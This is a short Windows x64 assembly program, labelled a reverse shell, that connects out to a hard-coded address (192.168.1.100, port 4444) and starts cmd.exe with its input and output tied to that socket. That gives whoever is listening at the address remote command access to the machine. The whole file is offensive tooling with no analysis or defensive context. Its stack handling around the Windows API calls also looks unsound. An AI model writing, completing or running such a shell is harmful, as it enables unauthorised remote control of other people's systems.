; ASSEMBLY REVERSE SHELL 1.0 - WINDOWS X64
BITS 64
default rel

section .data
    wsaData         times 400 db 0
    sock            dq 0
    sockaddr        dw 0x0002
                    dw 0x115C
                    db 192, 168, 1, 100
                    dq 0
    sinfo              times 104 db 0
    pinfo              times 24 db 0
    cmdStr          db "cmd.exe", 0

section .text
global main
extern WSAStartup
extern WSASocketA
extern connect
extern CreateProcessA
extern ExitProcess

main:
    sub rsp, 0x28

    lea rdx, [wsaData]
    mov ecx, 0x0202
    call WSAStartup

    xor ecx, ecx
    push rcx
    push rcx
    push rcx
    mov r9d, 6
    mov r8d, 1
    mov edx, 2
    mov ecx, 2
    call WSASocketA
    add rsp, 24
    mov [sock], rax

    mov rcx, [sock]
    lea rdx, [sockaddr]
    mov r8d, 16
    call connect
    test eax, eax
    jnz .exit

    lea rdi, [sinfo]
    xor eax, eax
    mov ecx, 13
.zeroloop:
    mov qword [rdi], 0
    add rdi, 8
    sub ecx, 1
    jnz .zeroloop

    lea rdi, [sinfo]
    mov dword [rdi], 104
    mov dword [rdi + 60], 0x100
    mov rax, [sock]
    mov [rdi + 80], rax
    mov [rdi + 88], rax
    mov [rdi + 96], rax

    xor ecx, ecx
    lea rdx, [cmdStr]
    xor r8d, r8d
    xor r9d, r9d
    push 0
    push 0
    lea rax, [pinfo]
    push rax
    lea rax, [sinfo]
    push rax
    push 0
    push 1
    call CreateProcessA

.exit:
    xor ecx, ecx
    call ExitProcess
